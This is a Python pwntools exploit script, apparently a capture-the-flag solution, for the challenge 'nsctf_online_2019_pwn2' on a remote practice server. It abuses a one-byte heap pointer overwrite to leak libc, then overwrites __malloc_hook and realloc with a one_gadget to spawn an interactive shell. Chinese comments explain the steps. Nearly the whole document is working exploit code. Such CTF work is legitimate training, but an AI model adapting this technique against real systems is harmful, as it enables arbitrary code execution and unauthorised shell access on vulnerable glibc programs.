# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './nsctf_online_2019_pwn2'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
# libc = elf.libc
libc = ELF('./libc-old/libc-2.23.so')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '26067'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 1
    while 1 :
        try:
            i+=0
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('exit\n',num)

def add(size):
    cmd(1)
    sla('size',size)

def delete():
    cmd(2)

def show():
    cmd(3)

def rename(text):
    cmd(4)
    sla('name',text)

def edit(text):
    cmd(5)
    sla('note',text)

one_gad = one_gadget(libc.path)

# 这题就不是单纯的 offbyone 了，这可以直接修改指针低一字节
# 也就是我们可以到达堆块一定范围的任意位置，泄露和写入都可

sla('name','a')
add(0xa8)
add(0x18)

rename('a'*0x30 + '\x10')
delete()
add(0x18)
# 这里也可以申请一个大小为 1 的，之后 edit 将空字节填充，同样可以泄露

rename('a'*0x30 + '\x30')
show()
leak = l64() - 0x68
libc.address = leak - libc.sym['__malloc_hook']
realloc = libc.sym['realloc']
ogg = one_gad[1] + libc.address

# 不同程序 realloc 汇编可能不一样 ，这里要手动看一下

lg('leak',leak)

add(0x68)
delete()
add(0x18)
rename('a'*0x30 + '\x30')

edit(p64(leak - 0x23))
add(0x68)
add(0x68)
edit('\x00'*11 + flat(ogg , realloc + 8))

# dbg('malloc')
add(0x18)

# dbg()


p.interactive()

'''
@File    :   nsctf_online_2019_pwn2.py
@Time    :   2021/08/29 18:51:18
@Author  :   Niyah 
'''